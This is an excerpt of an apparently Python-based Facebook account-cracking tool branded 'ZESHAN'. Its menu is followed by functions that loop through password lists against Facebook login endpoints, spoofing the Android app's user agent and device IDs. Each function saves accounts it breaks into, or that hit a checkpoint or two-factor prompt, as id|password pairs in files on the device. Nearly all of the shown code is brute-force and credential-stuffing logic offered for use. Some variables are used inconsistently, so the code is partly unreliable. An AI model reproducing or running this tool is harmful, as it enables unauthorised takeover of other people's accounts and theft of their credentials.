...
TOOL              FREE
VERSION        0.1
\033[1;32m\033[1;37m☞  𓆩ZESHAN𓆪\x1b[38;5;208mAUTHER     \033[1;37m➣   \x1b[38;5;205m
----------------------------------------------
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100092188935796&mibextid=ZbWKwL');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/ahsanbilal603?mibextid=ZbWKwL/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ZESHAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SSG:
                                print('\r\r\033[1;32m [ZESHAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ZESHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SSG:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ZESHAN-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ZESHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZESHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ZESHAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.55,width=1080,height=2159};FBLC/'+fblc+'/0;FBCR/GLOBE;FBMF/HUAWEI;FBBD/'+fbbd+'I;FBPN/com.facebook.katana;FBDV/CLT-L29;FBSV/'+fbsv+';FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZESHAN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZESHAN-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [ZESHAN-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZESHAN-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
